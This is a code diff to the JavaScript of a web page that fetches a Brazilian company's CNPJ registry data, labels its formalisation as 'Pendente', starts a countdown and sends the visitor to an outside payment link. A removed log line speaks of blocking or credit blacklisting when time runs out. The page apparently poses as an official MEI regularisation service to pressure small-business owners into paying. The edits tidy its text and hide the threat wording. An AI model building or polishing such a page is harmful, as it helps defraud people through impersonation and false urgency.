@@ -110,7 +110,7 @@
                 await new Promise(resolve => setTimeout(resolve, 400));
 
 if (!response.ok || data.error) {
-            const errorMessage = data.message || data.error || 'CNPJ nÃ£o encontrado ou invÃ¡lido. Verifique a chave de API.';
+            const errorMessage = data.message || data.error || 'CNPJ não encontrado ou inválido.';
             throw new Error(errorMessage);
         }
 
@@ -123,7 +123,7 @@ if (!response.ok || data.error) {
                 cnpjInfoDisplay.style.display = 'block';
                 waitingPayment.style.display = 'block';
                 startCountdown();
-                showSuccessNotification('CNPJ encontrado com sucesso!');
+                showSuccessNotification();
 
                 
 
@@ -134,7 +134,7 @@ if (!response.ok || data.error) {
                 
             } catch (error) {
                 console.error('Erro ao buscar CNPJ:', error);
-                showCNPJError(error.message || 'Erro ao buscar CNPJ. Verifique se o CNPJ estÃ¡ correto ou tente novamente mais tarde.');
+                showCNPJError(error.message || 'Erro ao buscar CNPJ. Verifique se o CNPJ está correto ou tente novamente mais tarde.');
             } finally {
                 if (loadingIndicator) {
                     loadingIndicator.classList.remove('show');
@@ -149,15 +149,15 @@ if (!response.ok || data.error) {
 
 const infoItems = [
 { label: 'CNPJ', value: formattedCnpj || data.cnpj || '-' },
-					                { label: 'SituaÃ§Ã£o Cadastral', value: '<span class="status-pending">Pendente</span>' },
+					                { label: 'Formalização', value: '<span class="status-pending">Pendente...</span>' },
 				                // Removido: Data da SituaÃ§Ã£o
-				                { label: 'RazÃ£o Social', value: data.company?.name || data.name || '-' },
+				                { label: 'Razão Social', value: data.company?.name || data.name || '-' },
 				                // Removido: Nome Fantasia
-				                { label: 'Natureza JurÃ­dica', value: 'MEI' },
+				                { label: 'Natureza Jurídica', value: 'MEI' },
 				                // Removido: Porte
 				                { label: 'Data de Abertura', value: data.founded || '-' },
 				                { label: 'Atividade Principal', value: data.mainActivity?.description || data.company?.mainActivity?.description || '-' },
-				                { label: 'EndereÃ§o', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
+				                { label: 'Endereço', value: `${data.address?.street || ''}, ${data.address?.number || ''} ${data.address?.complement || ''} - ${data.address?.district || ''}, ${data.address?.city || ''}/${data.address?.state || ''} - CEP: ${data.address?.zip || ''}`.trim() },
 				                { label: 'Telefone', value: data.phones?.[0]?.number || '-' },
 				                { label: 'E-mail', value: data.emails?.[0]?.address || '-' }
 				            ];
@@ -194,7 +194,7 @@ const infoItems = [
                 if (timeRemaining <= 0) {
                     clearInterval(countdownInterval);
                     // Opcional: Adicionar lógica para o que acontece quando o tempo acaba (ex: bloquear)
-                    console.log("Contagem regressiva finalizada. Ação de bloqueio/negativação pode ser acionada.");
+                    console.log();
                 } else {
                     timeRemaining--;
                 }
@@ -262,7 +262,7 @@ const infoItems = [
                 window.location.href = 'https://pay.pag-br.com/r/0S1HF964A1ji8335';
             } catch (error) {
                 console.error('Erro:', error);
-                alert('Erro ao processar solicitaÃ§Ã£o. Tente novamente.');
+                alert('Erro ao processar. Tente novamente.');
             } finally {
                 if (submitBtn) submitBtn.classList.remove('btn-loading');
                 if (loadingOverlay) loadingOverlay.style.display = 'none';
@@ -282,7 +282,7 @@ const infoItems = [
                         if (cnpjData) { // Verifica se os dados do CNPJ foram carregados
                             goToStep(2);
                         } else {
-                            showCNPJError('Por favor, digite um CNPJ vÃ¡lido para a busca antes de prosseguir.');
+                            showCNPJError('Por favor, digite um CNPJ válido antes de prosseguir.');
                         }
                     });
                 }
